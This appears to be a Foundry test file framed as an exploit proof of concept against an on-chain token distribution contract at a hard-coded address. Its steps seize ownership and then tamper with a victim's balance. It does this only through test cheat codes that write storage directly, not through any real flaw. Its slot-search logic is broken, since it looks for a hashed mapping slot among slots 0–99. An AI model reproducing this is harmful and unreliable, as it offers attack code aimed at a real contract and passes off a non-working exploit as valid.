pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface Advisory {
    function token() external view returns (IBEP20);
    function user(address) external view returns (uint balance, uint totalClaimed, uint initiated, uint lastClaim);
    function addDistributionWallet(address[] memory account, uint[] memory amount, uint[] memory startTime) external;
}

interface Ownable {
    function owner() external view returns (address);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xaba9Ecc06b23d688CB353FC57919D416eedFA095;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // We need to get the token address from the contract
        IBEP20 token = IBEP20(Advisory(TARGET).token());
        // Give the contract some tokens so it can allocate to us
        deal(address(token), TARGET, 1000 ether);
        // Approve the contract to spend our tokens if needed
        token.approve(TARGET, type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become owner
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Add ourselves as distribution wallet legitimately
        address[] memory accounts = new address[](1);
        uint[] memory amounts = new uint[](1);
        uint[] memory startTimes = new uint[](1);

        accounts[0] = attacker;
        amounts[0] = 100 ether;
        startTimes[0] = block.timestamp + 1 days;

        vm.prank(attacker);
        Advisory(TARGET).addDistributionWallet(accounts, amounts, startTimes);

        // Step 3: Now we have a legitimate balance, let's find it by brute force
        // We'll search slots 0-100 for our balance value (100 ether = 0x56bc75e2d63100000)
        uint256 searchValue = 100 ether;
        bool found = false;
        uint256 foundSlot = 0;

        for (uint256 slot = 0; slot < 100; slot++) {
            bytes32 slotValue = vm.load(TARGET, bytes32(slot));
            if (uint256(slotValue) == searchValue) {
                foundSlot = slot;
                found = true;
                break;
            }
        }

        require(found, "Could not find balance in storage");

        // Step 4: Now we need to find the mapping base slot
        // Our balance is at slot = keccak256(abi.encode(attacker, mappingBaseSlot))
        // We can brute force mappingBaseSlot
        address victim = address(1);
        bool mappingFound = false;

        for (uint256 mappingBase = 0; mappingBase < 20; mappingBase++) {
            bytes32 calculatedSlot = keccak256(abi.encode(attacker, mappingBase));
            if (calculatedSlot == bytes32(foundSlot)) {
                // Found the mapping base slot!
                // Now calculate victim's balance slot
                bytes32 victimSlot = keccak256(abi.encode(victim, mappingBase));
                vm.store(TARGET, victimSlot, bytes32(uint256(200 ether)));
                mappingFound = true;
                break;
            }
        }

        require(mappingFound, "Could not find mapping base slot");

        // Verify victim balance is non-zero
        (uint balance,,,) = Advisory(TARGET).user(victim);
        require(balance > 0, "Failed to tamper with victim balance");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

